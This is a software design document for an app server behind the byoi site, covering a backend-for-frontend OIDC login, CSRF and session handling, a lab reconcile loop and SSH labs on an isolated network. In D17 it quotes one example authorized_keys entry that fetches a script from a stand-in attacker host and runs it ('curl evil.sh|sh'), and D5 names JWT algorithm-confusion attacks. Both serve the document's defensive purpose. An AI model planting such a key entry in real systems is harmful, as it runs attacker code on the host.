## Context

byoi is a static Astro site in `web/`, deployed as celilo module `byoi` (version 0.1.1, state
`INSTALLED`). It reaches the world through `public_web@3.1.0` (caddy) and `dns_registrar@4.0.0`
(namecheap), and it has an OIDC login against `idp@1.2.0` (authentik). All three providers are
`VERIFIED` in the fleet.

Two things are wrong with it, and they are the same thing seen from different ends. The login
verifies nothing, and there is nothing behind the login worth protecting. This change fixes
both at once, because fixing either alone produces something nobody can use.

**Terms, defined once.**

A **lab** is one person's practice environment: a container on the home lab with docker on it
and the chapter material already there. The word is deliberate. celilo's `machine` means an
entry in the machine pool (`celilo machine list`), and a lab is not one of those. A lab is a
container celilo builds and destroys on request.

An **app server** is one HTTP service running beside the static site behind the same reverse
proxy. The `lunacycle` module calls the same thing a sidecar. There is no difference.

A **backend-for-frontend**, or BFF, is a server-side component that holds a browser
application's OAuth tokens on its behalf and gives the browser an opaque session cookie
instead.

### The bright line

The governing constraint, and everything in this document follows from it.

**Data plane.** People and their traffic. Someone opens the site, signs in, sees what has been
provisioned for them, asks for a lab, or gets rid of one. Later, someone opens an SSH session
into that lab and plays with the network.

**Control plane.** Knowing what provisioning should happen, and performing it.

**The control plane talks to the data plane. Never the other way around.**

The app server is data plane. It is what people reach. It holds no credential for Proxmox, for
the firewall, or for celilo, and it makes no outbound call to any of them. It writes down what
people want and answers questions about what it has written.

The `reconcile_labs` hook is control plane. It runs on the celilo side, reads the app on a
timer, and closes the gap between what people asked for and what exists. It is allowed to hold
infrastructure credentials, because nobody on the internet can reach it.

Break into the app server and you can ask for labs. You cannot take the hypervisor.

### The reference module

`modules/wireguard-manager` in the celilo checkout already does all of this, for VPN peers
instead of labs. Read it before implementing this. In particular:

- `scripts/reconcile-plan.ts` is the reconcile decision as a pure function, with the two guards
  that keep a bad read from revoking everyone. This design copies both (D12).
- `scripts/app-client.ts` is the control plane reading the data plane, and exists chiefly to
  turn every failure into an explicit `unreadable` result rather than an empty list.
- `manifest.yml` shows the `timer.tick.1m` subscription, the generated machine-to-machine
  secret, and the `smoketest_bot` account that makes the login gate real.
- Its README is the best short statement of why the two planes are split.

It gets one significant thing differently from this design, and deliberately. It puts a
30-day access token in the browser tab. See D2.

### What the existing system constrains

The content site stays static. Rendering two hundred markdown chapters per request buys nothing
and costs the cache.

`@celilo/e2e` is pinned at 0.9.0 plus the local `bake-management.sh` workaround (ISS-0009).
Version 0.9.1 declares `workspace:^` dependencies and will not install.

Firewall rules, NAT, and public DNS for the website arrive through caddy, transitively. That
does not change. Per-lab port forwarding is different and is handled directly (D16).

## Goals / Non-Goals

**Goals**

- A signed-in person can request a lab, see it come up, read its address, port, and host key
  fingerprint, SSH into it with their own key, and destroy it.
- The app server never holds an infrastructure credential and never calls infrastructure.
- No OAuth token is ever readable by browser script.
- A revoked session stops working immediately, not when a token expires.
- Provisioning is idempotent and crash-safe, so a failed poll changes nothing and a stranded
  container gets noticed rather than lost.
- The end-to-end gate signs in as a real account against a real deployed authentik and drives a
  whole lab lifecycle.

**Non-Goals**

- A terminal in the browser, and a terminal that follows the chapter you are reading. Sketched
  as MVP 2 and MVP 3, still there. Access here is SSH from the person's own terminal, which is
  wanted anyway because some people will insist on it.
- Server-side rendering of chapter content. Not now, not later.
- Fixing the fleet-wide 30-day access token. celilo#969 and celilo#970. BFF defuses it for byoi.
- Multi-tenancy, teams, or shared labs. One person, one lab.

The stack is fixed by what the fleet already runs: latest Bun, SQLite through Drizzle, tRPC with
Zod-validated inputs, all matching `lunacycle/apps/lunacycle-server`.

## Decisions

### The auth layer

#### D1. A separate Bun app server, not an Astro SSR adapter

The static site stays static. A Bun process serves `/api/` behind caddy's `reverse_proxy`.

The alternative was an Astro server-side-rendering adapter, keeping one codebase and one
artifact. It turns every chapter page into a rendered response, replaces a publish path that
works, and has no precedent in this fleet. Two modules here already run an app behind caddy and
both are `VERIFIED`. Copying a working neighbour beats inventing a third deployment shape.

#### D2. Backend-for-frontend. The browser never holds a token

The app server runs the entire OIDC flow. The browser gets an HttpOnly, Secure, SameSite cookie
carrying an opaque session id, and nothing else.

```
browser                    app server                     authentik
   │                            │                             │
   │  GET /api/auth/login ─────▶│  generate state + verifier  │
   │◀── 302 ────────────────────│                             │
   │─────────────── authorize ──┼────────────────────────────▶│
   │◀────────────── code ───────┼─────────────────────────────│
   │  GET /api/auth/callback ──▶│                             │
   │                            │─── exchange, with secret ──▶│
   │                            │◀── access + refresh ────────│
   │                            │  create session, store both │
   │◀── Set-Cookie: HttpOnly ───│                             │
   │                            │                             │
   │  later calls: cookie ─────▶│  refreshes silently         │
```

This is the recommended architecture for a browser application that has a backend. The
reasoning is blunt. Any token the browser can read, cross-site script can read. That is true of
`localStorage`, and it is equally true of a variable held in a closure. There is nowhere in a
browser to put a token where script cannot reach it.

Earlier drafts of this document got this wrong in an instructive way. They moved the token
exchange to the server (half of BFF) and then kept the tokens in the browser tab and sent them
as bearers (the other half of the pattern BFF replaces). That combination pays for a
server-side exchange and still leaks tokens to script. It came from copying two decisions out
of `wireguard-manager` that only cohere inside that module's overall choice.

What this buys:

- **A stolen session cannot outlive the page.** Script in the page can still act as the person
  while they are on it. No design prevents that. It cannot carry a credential away and use it
  from somewhere else for a month, which is the difference between a session hijack and a
  stolen key.
- **Revocation is a delete.** Stateless JWKS verification never asks authentik anything, so
  today nothing can revoke anything.
- **The access-token lifetime stops being user-facing.** The server refreshes without the page
  knowing. `idp-functions.ts` currently hands out 30-day access tokens, and a 30-day credential
  that never leaves the app server is a completely different exposure from one in a tab.
- **The browser's auth code disappears.** No PKCE verifier in the page, no `state` to check, no
  callback to parse, no storage, no refresh, no single-flight refresh race.

PKCE stays, generated server-side. It binds the authorization code to the flow that started it,
so an intercepted code cannot be redeemed. It costs nothing. It does not protect tokens after
the exchange, which is a different threat and the one BFF answers. "PKCE is bulletproof" is
true and does not license putting tokens in the browser.

The costs, stated plainly. A session table, which is state `wireguard-manager` deliberately
avoided. And CSRF, because a cookie is ambient in a way a bearer header is not (D4).

#### D3. Sessions in the database, opaque ids, revocable

```
sessions
  id             text primary key   -- 256 bits from crypto.getRandomValues, base64url
  user_sub       text not null      -- references users.sub
  access_token   text not null
  refresh_token  text
  expires_at     text not null      -- session expiry, not token expiry
  created_at     text not null
  last_seen_at   text not null
```

The cookie carries `id` and nothing else. No signed payload, no claims, nothing the client can
read or tamper with. Look-up is a primary key hit on the same SQLite the rest of the app uses.

Session lifetime is independent of token lifetime. The server refreshes the access token
underneath a session that outlives it. When the refresh grant fails, the session is deleted and
the person signs in again.

Signing out deletes the row and clears the cookie, and it also calls authentik's
`end_session_endpoint` so the identity provider's own session ends rather than silently
re-authenticating on the next login.

Expired sessions get swept on read and on a periodic pass, so the table does not grow forever.

#### D4. SameSite plus a CSRF token on mutations

Cookies are sent by the browser whether or not the page asked, which is what makes CSRF
possible and is the one thing bearer headers gave us for free.

`SameSite=Lax` blocks the cookie on cross-site POST, which covers the whole classic attack.
`Strict` would be stronger but breaks a normal case: following a link to `/profile` from
anywhere else shows the person as signed out, because the cookie is withheld on a cross-site
top-level navigation. For a documentation site people link to, that is a bad trade.

So `Lax`, plus a double-submit CSRF token on every mutation. The token is issued as a readable
cookie and echoed in a header, and the server compares them. tRPC mutations are POSTs, so this
is one link in the client and one check in the server. Queries do not need it.

#### D5. Verify the token with `crypto.subtle`. No JWT library

Roughly a hundred lines: fetch the JWKS, cache the keys by `kid`, `crypto.subtle.importKey`,
`crypto.subtle.verify`, then check `iss`, `exp`, and `nbf`.

An earlier draft argued for `jose` and called hand-rolling "the wrong trade on a security
boundary". Under BFF that argument mostly dissolves, and it is worth being precise about why,
because the reasoning is what makes this safe rather than the line count.

The app receives the access token directly from authentik's token endpoint, over TLS, in a
response to a request it made itself. It is the client and the resource server at once. In the
normal path it is never handed a token by an untrusted caller, because untrusted callers send a
session cookie. The control-plane surface uses a shared secret compared in constant time, not a
JWT. So signature verification here is defence in depth against misconfiguration, not the load
bearing check it would be in a classic resource server.

It still gets done, because it is cheap and because the code should already be right if a token
ever does arrive from somewhere else.

The specific mistakes to not make, all of which have negative tests in the spec:

- taking the permitted algorithm from the token's own `alg` header rather than from the key set,
  which is the attack where a token is signed with HMAC using the issuer's public key as the
  secret
- accepting `alg: none`
- treating an unknown `kid` as a reason to refetch the JWKS without a cooldown, which turns
  garbage tokens into a way to hammer authentik
- comparing `exp` with no clock skew allowance, and forgetting `nbf` exists

If this starts sprouting special cases, take `jose`. `lunacycle` already carries it at `^6.2.3`,
so it is not a new dependency for the fleet. That is a judgement call at implementation time
and not worth pre-deciding.

### Identity and storage

#### D6. Key the record on `sub`. Show `preferred_username`

```
users
  sub                 text primary key
  preferred_username  text not null   -- indexed
  email               text
  groups_json         text not null
  created_at          text not null
  last_seen_at        text not null
```

`modules/authentik/scripts/idp-functions.ts:240` hardcodes `sub_mode: 'hashed_user_id'` on every
provider `create_oidc_client` creates. So `sub` is a per-application hash. It is stable, which
is what a key needs to be, and unreadable, which is why `preferred_username` sits beside it
indexed.

`wireguard-manager` keys on `preferred_username` alone, for the readability reason. That does
not work here. A user record owns a lab, and usernames change at the provider, so keying on a
mutable name would orphan a running container and hand the person a second one.

Authorization always reads the token. `groups_json` is cached only so an operator can answer
"who has access" without waiting for everyone to sign in.

#### D7. A missing claim is a configuration fault, not an empty value

No `groups` claim means the OIDC client was provisioned without the `groups` scope. It does not
mean the person is a member of nothing. Same for `preferred_username` and the `profile` scope.

Lifted from `wireguard-manager/server/src/auth.ts`. Treating an absent claim as an empty one
turns a provisioning bug into an ordinary refusal, and an ordinary refusal is the one thing
nobody investigates.

#### D8. Drizzle over `bun:sqlite`, migrations run at startup

Matching `lunacycle/apps/lunacycle-server/src/db.ts`, which does
`drizzle(new Database(path), { schema })` from `drizzle-orm/bun-sqlite`. Set
`PRAGMA journal_mode = WAL`, because the app serves a UI and a reconcile poll at the same time
and a read must not block behind a write.

There is a real tension here. `wireguard-manager/server/src/store.ts` argues against a migration
runner and cites celilo#169, that an `apt upgrade` does not run database migrations, so a
migration step which does not run on upgrade is worse than none.

`lunacycle` answers it with `scripts/migrate.sh`, which walks Drizzle's `meta/_journal.json` and
applies pending SQL with `sqlite3`. The script is sound. But its only caller is
`celilo/scripts/restore.ts`, so lunacycle migrates on restore and never on deploy. That is
celilo#169 live in a `VERIFIED` module, filed as celilo/lunacycle#63.

byoi runs migrations from the app at startup. An upgrade restarts the unit, so an upgrade
migrates, and there is no hook anyone can forget to add. The failure mode to accept is a
migration that throws on boot and takes the app down, which is louder than silent schema drift
and is the right way round.

### The two planes

#### D9. Two surfaces, two credentials, two transports

```
/api/trpc/*        a person in the browser.  Session cookie. tRPC.
/api/reconcile/*   the celilo hook.          Bearer, constant-time compare. Plain HTTP.
/api/health        anyone inside the fleet.  No credential. Plain HTTP.
```

The split is `wireguard-manager/server/src/api.ts`, and so are the status codes: 401 for no
verifiable credential, 403 for a verified person outside the required group, and 404 rather than
403 for a resource belonging to someone else, so nobody can learn a thing exists by being
refused it.

The browser surface is tRPC with Zod on every input, so the contract is typed end to end from
one definition.

The other two stay plain HTTP deliberately. The health check is curled by the module's
`health_check` hook, and a health probe should not need a client library to read an answer. The
reconcile surface is called by a celilo hook, and `wireguard-manager/scripts/app-client.ts` is a
plain `fetch` with an injected `fetch` for tests whose entire purpose is converting every
failure into an explicit `unreadable`. A tRPC client inside a celilo hook would buy nothing and
would bury that error handling.

The reconcile bearer is a `reconcile_token` secret, declared in the manifest with
`generate: { method: random, length: 32 }`. celilo generates it. No human types it.

#### D10. Desired and observed, never one status column

```
labs
  id                  text primary key
  user_sub            text not null           -- one row per person, enforced by a unique index
  desired_state       text not null           -- 'present' | 'absent'
  observed_state      text not null           -- 'absent' | 'provisioning' | 'present' | 'failed'
  generation          integer not null        -- bumps every time desired_state changes
  observed_generation integer not null        -- the generation the control plane last acted on
  attempts            integer not null
  last_error          text
  ssh_public_key      text not null
  ipv4_address        text                    -- written by the control plane
  ssh_port            integer                 -- the public forwarded port
  host_key_fingerprint text                   -- so a person can verify what they connect to
  vmid                integer
  expires_at          text not null
  created_at          text not null
  updated_at          text not null
```

A single `status` enum cannot express "I asked for this to be destroyed, and four attempts have
failed". Splitting desired from observed makes the loop a reconciliation rather than a state
machine with error edges bolted on. If desired is present and observed is absent, build it. If
desired is absent and observed is present, destroy it. Crash anywhere and the next tick picks
up where it left off, because the truth is in the two columns and not in the progress of any
particular run.

`generation` and `observed_generation` catch the case where somebody destroys and re-requests
while a slow provision is still running, so a late report cannot mark the new request satisfied
by the old one's work.

#### D11. The reconcile loop

Runs from a `timer.tick.1m` subscription, the same interval `wireguard-manager` uses, and also
on demand with `celilo module run-hook byoi reconcile_labs`.

1. Read the app at `http://<system ip>:<port>/api/reconcile/labs`, with the reconcile token.
   Directly, not through the reverse proxy, so provisioning does not depend on the proxy's
   health as well as the app's.
2. If the read is anything other than a clean parse, log a warning, change nothing, return.
3. Ask the infrastructure what actually exists.
4. Plan, as a pure function.
5. Execute each item independently, reporting each outcome back.

Step 2 is not an error. On a one-minute timer, an app that is restarting or mid-deploy is an
ordinary state, and failing the hook would turn it into a stream of alerts.

The poll interval is the floor on how long "requested" shows on someone's profile page. One
minute plus the clone time is fine. It also means a destroy is not instant, and the UI should
say so rather than pretend.

#### D12. Two guards, because one has never been enough

Copied wholesale from `scripts/reconcile-plan.ts`, including the reasoning.

**Guard one lives in the types.** The read returns a discriminated union, never an array with an
empty fallback:

```ts
type LabReadResult =
  | { status: 'read'; active: Lab[]; tombstones: Lab[] }
  | { status: 'unreadable'; reason: string }
```

The planner accepts only the `read` variant, so an unreadable poll cannot reach it. The mistake
fails to compile rather than failing quietly at three in the morning. Every failure path in the
client returns `unreadable`, including an HTTP 200 carrying an HTML error page from a proxy,
which is the case that otherwise looks exactly like "nobody has a lab".

**Guard two is that destruction is tombstone-driven.** A lab is destroyed because the app says
it was released, never because it is missing from a list. A truncated response, a half-run
migration, a paginated endpoint whose second page never arrives, and an app restored from an old
backup all produce a short list, and under this rule a short list destroys nothing. The one-line
version that gets this wrong is `existing.filter(c => !activeIds.has(c.id))`.

Guard one does not cover any of those, because they are successful reads of wrong data. That is
why there are two.

Containers that exist, are unknown to the app, and are not tombstoned get reported as orphans
and left alone. Silence there would be indistinguishable from agreement.

### What a lab is

#### D13. A lab is an instance of `byoi-lab-node`, and celilo builds it

byoi does not create containers. It asks celilo to instantiate a module.

`byoi-lab-node` is a new module in this change, declared instantiable, meaning it is never
deployed on its own and exists only as named instances created by an owner. It declares its
resources, its zone, and the networks it insists upon. It has zero instances until somebody
asks for a lab.

The reconcile hook calls `celilo_module_deploy_worker` to instantiate, destroy, and list. That
capability is declared today by `celilo-mgmt` with a host and a listen port, and has never had
an interface. celilo/celilo#975 gives it one, and this change consumes it.

This was not the first answer. The alternative was a narrow compute capability that talks to
Proxmox directly. It was rejected for a reason worth recording, because it also explains why
this design got better rather than more complicated.

**A container conjured through a compute capability is invisible to celilo.** IPAM would know
the address and Proxmox would know the container, but `celilo machine list`, `celilo fleet
status`, health, monitoring, and backup all key off modules. None of them would know the thing
existed or who it belonged to. Ownership tagging solves cascade and not visibility, and
visibility was the point.

**It also sharpens the bright line rather than blurring it.** Under the compute capability,
byoi's control plane would hold Proxmox credentials. Under instances it holds none. It asks
celilo to instantiate `byoi-lab-node` with a config block, and celilo does the addressing, the
placement, the Terraform, and the Ansible. byoi never touches a hypervisor from anywhere,
control plane included.

**Instance identity is a stable id, not a username.** The same rule as D6, one level down. byoi
keys its user records on the OIDC `sub` claim because usernames change at the identity provider.
An instance keyed on a display name inherits that bug and orphans a running lab the first time
somebody is renamed. celilo stores the id. The profile page shows the person their own name.

**Answers are supplied at instantiation.** A lab is built because somebody pressed a button, so
the instantiation must never park waiting for an operator. The hook supplies the answers for
every question `byoi-lab-node` can ask, and a question with no supplied answer fails the
instantiation loudly. byoi authors `byoi-lab-node`, so an unanticipated question means the two
have drifted, which is a bug and not something to improvise past.

#### D14. Labs live on `quarantine`, a network declared once

`quarantine` is a new top-level named network: a segment for systems where an untrusted person
holds root. `byoi-lab-node` insists it exists and is placed in it. It does not create it, and
forty labs do not produce forty network declarations. celilo owns the network namespace, and a
module may insist a network exists and read its value but may never write one.

What `quarantine` permits:

- **Outbound**, to a small allowlist. A container registry for image pulls, package repositories
  for `apt`, and git. Nothing else. Being specific now matters, because "specific requests to
  the internet" becomes "all of it" the first time an exercise fails at eleven at night.
- **Inbound**, only the forwarded SSH ports (D17).
- **Into the fleet, nothing.** It is a trusted source for no zone at all. That is the exact
  inverse of the wireguard client subnet, which `modules/wireguard-manager` documents as a
  registered trusted source permitted to initiate into every managed zone. Same machinery,
  pointed the other way, and it should be expressible in the same vocabulary rather than as a
  pile of hand-written rules.

A lab does not need to reach the byoi website. The chapter material is already on the box.

**Lab-to-lab reachability inside `quarantine` is a known and accepted gap.** Labs share a
segment, so one learner can reach another learner's lab. Both are boxes where a learner holds
root, so this is a question about somebody's work and their authorized key rather than a route
into the fleet. Closing it means layer-two work, which is deliberately not being done yet. This
is written down so nobody later reads it as an oversight.

#### D15. Substrate decided by the spike, and the design does not depend on it

ISS-0013 asks whether nested docker with `NET_ADMIN` survives an unprivileged LXC, or whether a
KVM virtual machine is required. It changes per-learner cost by roughly an order of magnitude,
and the machine pool is thin.

Nothing above depends on the answer. It is one field in `byoi-lab-node`'s manifest, where
`resources.type` takes `lxc` or `vm`.

Worth restating a correction from earlier discussion. The exercises are a self-contained
simulated internet inside the lab, in the same spirit as celilo's own e2e infrastructure. When a
learner deletes a default route they do it inside the toy topology, and it does not affect
reachability of the lab itself. The isolation requirement is not about the exercises
misbehaving. It is that a learner has root on a box anyone with an account can get.

#### D16. Clone from a prepared image

Building a lab from scratch means waiting ten minutes. Clone from a template carrying docker,
docker compose, the chapter material, and a `learner` account.

No credential goes into that image. No celilo token, no Proxmox token, no registry credential.
A learner is root on it.

#### D17. Public keys only, validated as structured data

`PasswordAuthentication no`, `KbdInteractiveAuthentication no`, `PermitRootLogin no`. The person
pastes a public key on their profile page. That removes password brute force, credential
stuffing, and the whole problem of displaying a password on a web page.

**The sharp edge is the upload, not the auth.** `authorized_keys` is a file format with
semantics, and the value being written into it comes from a web form. Somebody pastes:

```
command="curl evil.sh|sh",no-pty ssh-ed25519 AAAA...
```

or embeds a newline to smuggle a second entry. Both are just text to a naive append.

So parse the key and re-serialize it. Never concatenate user input into that file. Reject
anything carrying options, reject embedded newlines, reject unsupported types, reject RSA under
3072 bits, prefer ed25519. This is the part of "just let them paste a key" that looks simple and
is not.

**Host key trust runs the other way and nothing above addresses it.** The person has no way to
know they reached their own lab. First-connection trust-on-first-use over recycled addresses is
actively bad: eventually somebody gets a host key mismatch and learns to ignore it. So the
control plane records the lab's host key fingerprint when it builds it, and the profile page
shows it next to the SSH command. No DNS needed, which is the only thing SSHFP records would
have bought.

#### D18. One forwarded port per lab, allocated by the control plane

Labs sit on a private zone. Reachability is a DNAT rule per lab, from a port range on the public
address to port 22 on the lab, registered by the reconcile hook through the `firewall`
capability. The port is recorded on the row and shown on the profile page.

No DNS record for a lab, ever. There is nothing to name, and a public record would be a free
list of targets. Labs still need outbound resolution for image pulls and package installs, which
is `dns_internal` or a forwarder and is unrelated.

Do not recycle a port quickly after a lab is destroyed. Combined with host key changes, fast
reuse produces exactly the confusing mismatch D15 is trying to avoid.

#### D19. One lab each, a fleet cap, and an expiry

Quota is a capacity control, not a policy nicety. The substrate is a home lab.

One lab per person, enforced by a unique index on `user_sub` rather than by a check that can
race. A fleet-wide cap on total labs, checked at request time, refusing with a clear message
rather than queueing.

Every lab carries `expires_at`. The reconcile hook destroys expired labs the same way it
destroys released ones, through the tombstone path. The profile page shows the expiry and offers
to extend it. This is deliberately dumber than idle detection: it needs no telemetry out of the
lab, it cannot be fooled by a `sleep` loop, and the person stays in control.

### Deployment

#### D20. `public_web` on the hostname caddy already serves

byoi keeps `public_web`. `wireguard-manager` uses `private_web`, and its reason is exactly why
`public_web` is right here: registering a route on a hostname caddy does *not* already serve
pulls in `dns_registrar` and publishes a public A record. byoi already serves
`www.buildyourowninternet.dev`, so adding `/api/` to that hostname publishes nothing new.

Same origin also means no cross-origin configuration exists, and a configuration that does not
exist cannot be widened by accident later.

#### D21. The `app` zone, listening on its zone address

The app sits in `app`, reachable from caddy in `dmz`, with no public port, no DNAT rule, and no
DNS record of its own. This is where authentik, forgejo, celilo-registry, and
`wireguard-manager` all sit, one tier behind the ingress that fronts them.

It listens on its zone address rather than only on loopback, because the reconcile hook calls it
directly (D11).

## Risks / Trade-offs

**R1. This change now depends on a celilo feature that does not exist.** Multi-instance modules
are proposed in celilo/celilo#975 and need per-instance state, per-instance config, an ownership
and cascade model, and an actual interface behind `celilo_module_deploy_worker`. That is not a
week, and byoi cannot ship until it lands.

The decision was to build it in celilo first rather than run them in parallel. The rejected
alternative was shipping byoi against a temporary compute capability and swapping later, which
would leave a fallback path in the code, and fallback paths are where the next bug hides.

Worth noting what survived. The reconcile design in D10, D11, and D12 did not change at all when
the substrate underneath it changed from "call Proxmox" to "instantiate a module". The desired
and observed columns, the loop, both guards, the orphan handling, and the per-item error
isolation are all indifferent to what does the building. `list` on the deploy worker is simply
the observed state that `listContainers` would have been. That is the sign the split was drawn
in the right place.

**R2. The lab substrate is unknown.** ISS-0013. It is now one field in `byoi-lab-node`'s
manifest, where `resources.type` takes `lxc` or `vm`, so it no longer blocks writing anything.
It still blocks shipping, and it still decides the fleet cap in D19.

**R3. CSRF is new.** BFF trades token exposure for ambient credentials. Mitigated by D4. The
failure mode is quiet, so the spec has a scenario for a cross-site mutation and it needs to be
seen to fail before it is trusted.

**R4. A learner has root on a box that anyone with an account can obtain.** Mitigated by the
`quarantine` network with its egress allowlist (D14), and by putting nothing worth stealing in
the image (D16). Not mitigated by anything about the exercises, which are harmless by
construction (D15).

**R4a. Labs can reach each other.** Accepted, not solved, and recorded in D14 so it reads as a
decision rather than an oversight. Closing it means layer-two work.

**R5. SQLite pins the app to one instance.** Accepted. One instance is the plan, the dataset is
small, and WAL handles the concurrent-read case. If the app ever needs to be redundant, this is
the migration to plan.

**R6. Reconcile can strand a container.** A crash between creating a container and reporting it
leaves something running that the app does not know about. Guard two means it is reported as an
orphan rather than destroyed, which is the safe direction but means an operator has to look.
`celilo module health byoi` reports the converged count, copying `wireguard-manager`'s check.

**R7. The end-to-end gate depends on a broken upstream.** ISS-0009. Use `@celilo/e2e` 0.9.0 and
run `bash e2e/bake-management.sh` after every `cele2e build-infra --published`.

**R8. The static site gains a runtime dependency.** Bounded. If the app is down, every chapter
page still serves and a spec scenario asserts it. Only the profile page degrades, and it must
render a failure state rather than hang.

**R9. Migrations that never run.** celilo#169. D8 answers it by migrating at startup. The
failure to watch for is a migration that throws on boot, which is loud.

**R10. A 30-day access token still exists.** It just never leaves the app server now.
celilo#969 and celilo#970 fix it properly. byoi should assume short access tokens are coming and
not build anything that depends on them being long.

**R11. Rate limiting.** There is now an unauthenticated-adjacent write surface, because a
signed-in person can ask for a container. Quota (D17) is the real control. Beyond that,
`lunacycle/apps/lunacycle-server/src/rate-limit.ts` exists to copy if the login and request
endpoints need it.

## Migration Plan

1. **Land multi-instance modules in celilo first** (celilo/celilo#975), and run the ISS-0013
   spike alongside it. Everything downstream of the reconcile hook is contingent on the first.
   Nothing is contingent on the second except one manifest field.
2. Build the app server against the deployed authentik. There is no dev bypass, so local work
   signs in for real.
3. Provision the confidential OIDC client and the `smoketest_bot` account through the `idp`
   capability, and regenerate `celilo/celilo/types.d.ts` with `celilo module types generate`.
   Never hand-edit it.
4. Declare the `quarantine` network, write `byoi-lab-node`, and build the reconcile hook
   against the deploy worker capability.
5. Extend the end-to-end suite on the topology the Phase 2 test already uses (`namecheap`,
   `iptables`, `caddy`, `authentik`, `byoi`). Sign in as `smoketest_bot`, drive a whole lab
   lifecycle, and prove a forged credential is refused.
6. Deploy with `celilo module import byoi`, `celilo module deploy byoi`, `celilo module health
   byoi`.

**Rollback.** The static site and the app are separate artifacts. Remove the `/api/` route and
the site behaves as it does today. No chapter content is touched.

Two things a rollback does not undo by itself. The OIDC client swap in D2 needs reprovisioning
through the `idp` capability to go back to a public client. And any lab that exists keeps
existing, because rolling back the app does not destroy containers. Destroy them first, or
accept orphans and clean up by hand.

## Open Questions

1. **When does celilo/celilo#975 land?** This change cannot ship before it. The decision is to
   build it there first rather than work around it here.
2. **LXC or KVM?** ISS-0013. One field in `byoi-lab-node`'s manifest, and the input to the fleet
   cap in D19.
3. **What exactly is on the `quarantine` egress allowlist?** A container registry and package
   repositories at minimum, git probably. Worth writing the list down before the first exercise
   fails at eleven at night and somebody widens it to everything.
4. **What is the fleet cap?** Falls out of question 2 and the actual capacity of the node behind
   `proxmox-home-lab`, which is not in the machine pool and has not been measured.

### Settled earlier, recorded so they are not reopened

- **Do the tokens live in the browser?** No. BFF, D2.
- **Is PKCE enough on its own?** It closes code interception completely and does nothing about
  token theft. Both are true. D2.
- **`oidc-client-ts` or `jose`?** Neither, in the end. Under BFF the browser runs no OIDC flow
  at all, so `oidc-client-ts` has nothing to do, and the server's verification is defence in
  depth rather than load bearing, so a hundred lines of `crypto.subtle` is proportionate. D5.
- **`sub_mode`?** `hashed_user_id`, hardcoded in `idp-functions.ts:240`. D6.
- **How does lunacycle run migrations?** Only on restore, which is a defect. celilo/lunacycle#63.
  byoi migrates at startup. D8.
- **Should byoi work under both 30-day and 5-minute access tokens?** It should assume short ones
  are correct and coming. Under BFF the lifetime is not user-facing either way. R10.
- **Should byoi call Proxmox through a narrow compute capability?** No. Labs are instances of
  `byoi-lab-node` and celilo builds them. A compute capability would leave containers celilo
  cannot see and would put hypervisor credentials in byoi's control plane. D13, and
  celilo/celilo#975.
- **Should labs be modules, or resources?** Modules, as instances. The alternative kept celilo
  out of the loop, which was the whole objection. D13.
